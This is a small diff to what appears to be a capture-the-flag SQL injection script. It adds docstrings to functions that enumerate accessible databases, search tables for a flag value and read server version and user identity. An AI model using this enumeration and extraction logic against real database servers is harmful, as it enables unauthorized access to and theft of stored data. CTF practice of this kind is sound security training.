@@ -285,6 +285,7 @@ def main():
         return mysqli.getValue(columnName, f"SELECT {columnName} FROM {databaseName}.{tableName} WHERE {columnName} LIKE 'CTF{{%}}' LIMIT 1")
 
     def findFlag():
+        """Search through the available databases looking for a flag value"""
 
         databases = mysqli.getDatabaseNames()
         print (f"User has access to databases {databases}")
@@ -304,6 +305,8 @@ def main():
 
     
     def serverInfo():
+        """Get the server version info and user name as an example of evaluating expressions"""
+
         values = {}
         for expr in ["@@VERSION", "@@VERSION_COMMENT", "USER()", "CURRENT_USER()", "DATABASE()"]:
             value = mysqli.getValue(expr)
